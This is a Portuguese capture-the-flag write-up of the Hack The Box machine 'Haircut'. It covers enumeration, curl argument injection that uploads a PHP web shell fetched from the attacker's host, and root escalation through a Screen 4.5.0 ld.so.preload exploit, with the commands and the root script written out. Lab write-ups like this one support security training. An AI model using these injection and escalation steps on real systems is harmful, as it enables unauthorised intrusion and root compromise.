---
title: "Hack The Box - Haircut"
tags: [Linux,Medium,Linpeas,Kernel,Gobuster,BurpSuite,Web]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/21>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas

> Porta 22 -> SSH

> Portas 80 -> Servidor Web

## Enumeração da porta 80

Abrindo a página verificamos o que tem nela (Porta 80)

Verificamos a página inicial do apache

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_web.png)

## Gobuster

Executamos o gobuster para procurar por diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_gobuster.png)

> gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100

Explicação parâmetros

> dir --> Diretórios

> -u --> URL

> -w --> Wordlist utilizada

> -x --> Vai procurar por arquivos com extensão .php também

> -t --> Aumento o número de threads para ir mais rápido

### Exposed.php

Encontramos um `exposed.php`, vamos verificar do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exposed.png)

Hum... interessante ele parece que da um curl no link que colocamos ali, será que ele chega até nós?

Vamos testar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exposed1.png)

Sim!! Ele da um `curl` no link que colocarmos ali

### /uploads

Bom, vendo a sintaxe do curl, vemos que podemos salvar arquivos na máquina com ele... será que não da pra mandarmos um shell php lá? Possivelmente sim, mas onde será que ele vai ser salvo? Hummmm, tem um /uploads, possivelmente nessa pasta dê certo.... Mas onde ela está no servidor? Bom, seguindo da premissa que é uma máquina Linux, os servidores web ficam em `/var/www/html...` então, dentro dessa html deve ter uma pasta uploads onde podemos jogar nosso shell ali.

# Explorando o curl

Suspeitamos inicialmente que o sistema está rodando um payload mais ou menos assim:

`system('./curl $url')`

Vamos tentar comprovar isso? Iremos fazer através do `BurpSuite`

Jogamos uma requisição do site para lá

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_bs.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_bs1.png)

Mandamos pro repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_bs2.png)

Verificamos a versão do curl, com o -V

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_bs3.png)

Exatamente como eu estava pensando que era o payload, agora ficou fácil de explorar

Verificamos como funciona a questao do output no curl

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_chelp.png)

Montamos nosso payload para ser salvo no /uploads

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_s.png)

## Upando o shell.php no servidor

> -o /var/www/html/uploads/shell.php http://10.10.16.119/shell.php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_up.png)

## Testando RCE

Agora vamos testar RCE no servidor, vamos fazer pelo burp mesmo. Uma vez que eu sei que é só mudar a URL pra /uploads e o parâmetro cmd

Pronto! Temos RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_rce.png)

## Reverse shell

Bom, agora é só pegar um reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_up1.png)

# Escalação de privilégio

Uma vez que já temos acesso à máquina, vamos iniciar a fase de escalação de privilégio

Rodaremos o `linpeas` pq eu gosto das cores que aparece nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_linpeas.png)

Passando e rodando na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_linpeas1.png)

Encontramos dois modos de escalar na máquina

Através de `Kernel` e pelo `Screen`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_priv.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_priv1.png)

## 1º Modo - Screen 4.5.0

Procuramos por exploits para o Screen

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_search.png)

Verificamos como ele funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_search1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_search2.png)

### Explorando Screen 4.5.0

Reproduzimos os passos da PoC pra ver se da certo, dando certo possivelmente podemos escalar privilégio pelo script. (Claro que daria pra testar direto, mas vamos lá, fazer as coisas bem explicadas)

Pelo que eu tava lendo a ideia desse exploit é conseguir criar um arquivo como root através do `screen`, e consequentemente fazer o que quisermos com arquivos que tem como dono o root. Criar link simbólicos, acessar os arquivos, etc...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_screen.png)

Agora executamos o script que tem no searchsploit 

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_search.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_search3.png)

O ideal é sempre compilarmos os exploits nas máquinas em que elas serão executadas

Ao verificarmos o exploit ele é composto por 3 arquivos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp.png)

Desmembrados:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_separados.png)

Enviamos pra máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp1.png)

Compilamos ele, como determinado pelo script

> gcc -fPIC -shared -ldl -o exploit.so exploit.c

Vimos que deu erro na library 'cc1', pesquisamos por ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp3.png)

Colocamos ela no PATH para ser executada

> export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/5/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp4.png)

Compilamos novamente, vai dar uns erro maluco mas é normal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp5.png)

Pronto, vamos para o próximo

> gcc -o rootshell rootshell.c

Novamente, uns erro maluco mas é assim mesmo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp6.png)

Agora por útilmo executo o que está no `root.sh` e corro pro abraço!

#### Ganhando shell de root

Obs: aqui verificiar que o exploit.so foi o que eu criei compilando, no exploit ele fala de libhax.so

```
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/exploit.so"
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exec.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_exp8.png)

## Escalação por Kernel (2º Modo)

Ao vizualizarmos a versão do Kernel pesquisamos por exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_k.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_k2.png)

Copiamos para nossa pasta de trabalho e mandamos para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_k3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_k4.png)

Verificamos como compilar e compilamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_k5.png)

### Pegamos flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-haircut/H_root.png)